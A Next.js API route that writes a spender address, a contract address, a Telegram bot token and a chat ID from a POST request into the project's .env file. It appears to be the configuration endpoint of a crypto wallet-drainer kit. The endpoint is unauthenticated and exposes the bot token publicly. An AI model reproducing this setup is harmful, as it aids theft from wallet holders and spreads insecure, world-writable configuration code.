import { NextApiRequest, NextApiResponse } from "next";
import fs from "fs";
import path from "path";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    const { spenderAddress, contractAddress, botToken, chatId } = req.body;

    const envPath = path.resolve(process.cwd(), ".env");

    // Read existing .env file
    const envContent = fs.readFileSync(envPath, "utf-8");
    const envVars = envContent.split("\n");

    // Parse existing variables into an object
    const envObject: { [key: string]: string } = {};
    envVars.forEach((line) => {
      const [key, value] = line.split("=");
      if (key && value) {
        envObject[key] = value.replace(/"/g, "").trim(); // Remove quotes if present
      }
    });

    // Update only specific variables
    envObject["NEXT_PUBLIC_SPENDER_ADDRESS"] = spenderAddress;
    envObject["NEXT_PUBLIC_ADDRESS"] = contractAddress;
    envObject["NEXT_PUBLIC_BOT_TOKEN"] = botToken;
    envObject["NEXT_PUBLIC_CHAT_ID"] = chatId;

    // Preserve SKIP_PREFLIGHT_CHECK and NEXT_PUBLIC_PROJECT_ID
    // These are not in the form and should remain intact
    if (!envObject["SKIP_PREFLIGHT_CHECK"]) {
      envObject["SKIP_PREFLIGHT_CHECK"] = "true"; // Set a default if needed
    }
    if (!envObject["NEXT_PUBLIC_PROJECT_ID"]) {
      envObject["NEXT_PUBLIC_PROJECT_ID"] = "6ffddd4ace751579e6a1f075545dde02"; // Set a default if needed
    }

    // Convert object back to .env format
    const newEnvContent = Object.entries(envObject)
      .map(([key, value]) => `${key}="${value}"`)
      .join("\n");

    // Write updated content back to the .env file
    fs.writeFileSync(envPath, newEnvContent, "utf-8");

    res.status(200).json({ message: "Environment variables updated successfully!" });
  } else {
    res.status(405).json({ message: "Method not allowed" });
  }
}
